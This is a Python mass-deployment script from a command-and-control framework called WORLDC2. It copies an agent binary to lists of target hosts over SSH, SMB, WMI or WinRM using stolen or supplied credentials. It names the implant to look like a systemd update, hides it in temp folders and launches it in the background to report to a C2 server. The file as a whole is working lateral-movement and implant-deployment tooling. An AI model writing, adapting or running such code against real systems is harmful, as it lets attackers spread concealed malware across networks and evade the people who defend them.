#!/usr/bin/env python3
"""
WORLDC2 C2 — Mass Deployment Script
Deploys agent to multiple targets via SSH, SMB, WMI, or WinRM.

Usage:
    python3 deploy_mass.py --targets targets.txt --user admin --password Pass123 --method ssh
    python3 deploy_mass.py --targets targets.txt --method smb --hashes aad3b435...
    python3 deploy_mass.py --targets targets.txt --method winrm --user admin --password Pass123
"""

import os
import shutil
import time
import argparse
import subprocess
import threading
from pathlib import Path

GREEN = "\033[92m"; RED = "\033[91m"; YELLOW = "\033[93m"
CYAN = "\033[96m"; BOLD = "\033[1m"; RESET = "\033[0m"

PROJECT_ROOT = Path(__file__).parent.parent

def banner():
    print(f"""{BOLD}{CYAN}
   ╔══════════════════════════════════════════════╗
   ║         WORLDC2 C2 — Mass Deployment             ║
   ║         ruby570bocadito                      ║
   ╚══════════════════════════════════════════════╝
{RESET}""")

def load_targets(path):
    with open(path) as f:
        return [line.strip() for line in f if line.strip() and not line.startswith('#')]

def get_agent_binary():
    """Find the appropriate agent binary for the target OS."""
    linux = PROJECT_ROOT / "worldc2-agent"
    windows = PROJECT_ROOT / "worldc2-agent.exe"
    darwin_amd = PROJECT_ROOT / "dist" / "worldc2-agent-darwin-amd64"
    darwin_arm = PROJECT_ROOT / "dist" / "worldc2-agent-darwin-arm64"
    
    if linux.exists():
        return str(linux)
    if windows.exists():
        return str(windows)
    return None

def deploy_ssh(target, user, password, port, server_addr, results):
    """Deploy via SSH."""
    try:
        agent_bin = get_agent_binary()
        if not agent_bin:
            results[target] = ("FAIL", "No agent binary found")
            return

        sshpass = shutil.which("sshpass")
        if not sshpass:
            results[target] = ("FAIL", "sshpass not found in PATH")
            return

        remote_path = "/tmp/.systemd-update"
        # Password via SSHPASS env (sshpass -e): no secrets on the command line,
        # and argument lists avoid shell interpolation of user/password.
        env = {**os.environ, "SSHPASS": password}

        # Upload agent (scp uses -P for port)
        r = subprocess.run(
            [sshpass, "-e", "scp", "-o", "StrictHostKeyChecking=no", "-P", str(port),
             agent_bin, f"{user}@{target}:{remote_path}"],
            env=env, capture_output=True, text=True, timeout=30)
        if r.returncode != 0:
            results[target] = ("FAIL", f"SCP failed: {(r.stderr or '').strip()[:100]}")
            return

        # Make executable and run (ssh uses lowercase -p for port)
        r = subprocess.run(
            [sshpass, "-e", "ssh", "-o", "StrictHostKeyChecking=no", "-p", str(port),
             f"{user}@{target}",
             f"chmod +x {remote_path} && nohup {remote_path} --server {server_addr} >/dev/null 2>&1 &"],
            env=env, capture_output=True, text=True, timeout=30)
        if r.returncode == 0:
            results[target] = ("OK", "Deployed via SSH")
        else:
            results[target] = ("FAIL", f"SSH exec failed: {(r.stderr or '').strip()[:100]}")
    except Exception as e:
        results[target] = ("FAIL", str(e))

def deploy_smb(target, user, password, port, server_addr, results):
    """Deploy via SMB (Windows). `port` unused (SMB uses 445); kept for uniform worker signature."""
    try:
        agent_bin = get_agent_binary()
        if not agent_bin:
            results[target] = ("FAIL", "No agent binary found")
            return

        smbclient = shutil.which("smbclient")
        if not smbclient:
            results[target] = ("FAIL", "smbclient not found in PATH")
            return

        # Try to copy via smbclient (argument list: credentials never hit a shell)
        r = subprocess.run(
            [smbclient, f"//{target}/C", "-U", f"{user}%{password}",
             "-c", f"put {agent_bin} Windows/Temp/.systemd-update.exe"],
            capture_output=True, text=True, timeout=30)

        if r.returncode == 0:
            # Execute via wmic
            wmic = shutil.which("wmic")
            if not wmic:
                results[target] = ("PARTIAL", "Uploaded but wmic not available")
                return
            r2 = subprocess.run(
                [wmic, f"/node:{target}", f"/user:{user}", f"/password:{password}",
                 "process", "call", "create",
                 f"C:\\Windows\\Temp\\.systemd-update.exe --server {server_addr}"],
                capture_output=True, text=True, timeout=30)
            if r2.returncode == 0:
                results[target] = ("OK", "Deployed via SMB+WMIC")
            else:
                results[target] = ("PARTIAL", "Uploaded but execution failed")
        else:
            results[target] = ("FAIL", f"SMB copy failed: {(r.stderr or '').strip()[:100]}")
    except Exception as e:
        results[target] = ("FAIL", str(e))

def deploy_winrm(target, user, password, port, server_addr, results):
    """Deploy via WinRM (Windows). `port`/`server_addr` unused here; kept for uniform signature."""
    try:
        winrs = shutil.which("winrs")
        if not winrs:
            results[target] = ("FAIL", "winrs not found in PATH")
            return
        # First try winrs (built into Windows)
        r = subprocess.run(
            [winrs, f"-r:http://{target}:5985", f"-u:{user}", f"-p:{password}", "cmd /c echo test"],
            capture_output=True, text=True, timeout=10)

        if r.returncode == 0:
            # Upload via SMB then execute via WinRM
            results[target] = ("OK", "WinRM reachable — use SMB for upload")
        else:
            results[target] = ("FAIL", "WinRM not available")
    except Exception as e:
        results[target] = ("FAIL", str(e))

def deploy_wmi(target, user, password, port, server_addr, results):
    """Deploy via WMI (Windows). `port`/`server_addr` unused here; kept for uniform signature."""
    try:
        wmiexec = shutil.which("wmiexec.py") or shutil.which("wmiexec")
        if not wmiexec:
            results[target] = ("FAIL", "wmiexec.py (impacket) not found in PATH")
            return
        # Use impacket's wmiexec (argument list: password never hits a shell)
        r = subprocess.run(
            [wmiexec, f"{user}:{password}@{target}", "cmd.exe /c echo test"],
            capture_output=True, text=True, timeout=30)

        if r.returncode == 0:
            results[target] = ("OK", "WMI reachable")
        else:
            results[target] = ("FAIL", "WMI not available")
    except Exception as e:
        results[target] = ("FAIL", str(e))

def main():
    banner()
    
    parser = argparse.ArgumentParser(description="WORLDC2 Mass Deployment")
    parser.add_argument("--targets", "-t", required=True, help="File with target IPs (one per line)")
    parser.add_argument("--user", "-u", default="admin", help="Username")
    parser.add_argument("--password", "-p", default="", help="Password")
    parser.add_argument("--hashes", "-H", default="", help="NTLM hashes (pass-the-hash)")
    parser.add_argument("--method", "-m", choices=["ssh", "smb", "winrm", "wmi"], default="ssh", help="Deployment method")
    parser.add_argument("--port", type=int, default=22, help="SSH port (default: 22)")
    parser.add_argument("--server", "-s", default=None, help="C2 server address (auto-detect)")
    parser.add_argument("--threads", default=10, type=int, help="Concurrent threads")
    args = parser.parse_args()
    
    # Auto-detect server address
    if not args.server:
        import socket
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            args.server = s.getsockname()[0] + ":8443"
            s.close()
        except Exception as e:
            print(f"{YELLOW}[!] IP auto-detect failed ({e}); using 127.0.0.1:8443{RESET}")
            args.server = "127.0.0.1:8443"
    
    targets = load_targets(args.targets)
    print(f"{BOLD}Targets:{RESET} {len(targets)} hosts")
    print(f"{BOLD}Method:{RESET} {args.method}")
    print(f"{BOLD}Server:{RESET} {args.server}")
    print(f"{BOLD}Threads:{RESET} {args.threads}")
    print()
    
    results = {}
    threads = []
    
    deploy_func = {
        "ssh": deploy_ssh,
        "smb": deploy_smb,
        "winrm": deploy_winrm,
        "wmi": deploy_wmi,
    }[args.method]
    
    print(f"{YELLOW}Deploying to {len(targets)} targets...{RESET}\n")

    def worker(target):
        """Thread body: never let an exception escape silently; record it instead."""
        try:
            deploy_func(target, args.user, args.password, args.port, args.server, results)
        except Exception as e:
            results[target] = ("FAIL", str(e))

    for target in targets:
        t = threading.Thread(target=worker, args=(target,))
        threads.append(t)
        t.start()
        
        # Limit concurrent threads
        if len([th for th in threads if th.is_alive()]) >= args.threads:
            time.sleep(1)
    
    # Wait for all threads
    for t in threads:
        t.join()
    
    # Print results
    print(f"\n{BOLD}{'='*60}{RESET}")
    print(f"{BOLD}Deployment Results:{RESET}\n")
    
    ok = sum(1 for r in results.values() if r[0] == "OK")
    fail = sum(1 for r in results.values() if r[0] == "FAIL")
    partial = sum(1 for r in results.values() if r[0] == "PARTIAL")
    
    for target, (status, msg) in sorted(results.items()):
        if status == "OK":
            print(f"  {GREEN}[✓]{RESET} {target:20s} {msg}")
        elif status == "PARTIAL":
            print(f"  {YELLOW}[!]{RESET} {target:20s} {msg}")
        else:
            print(f"  {RED}[✗]{RESET} {target:20s} {msg}")
    
    print(f"\n{BOLD}Summary: {GREEN}{ok} OK{RESET} | {YELLOW}{partial} PARTIAL{RESET} | {RED}{fail} FAIL{RESET}{RESET}")
    print(f"{BOLD}{'='*60}{RESET}")

if __name__ == "__main__":
    main()
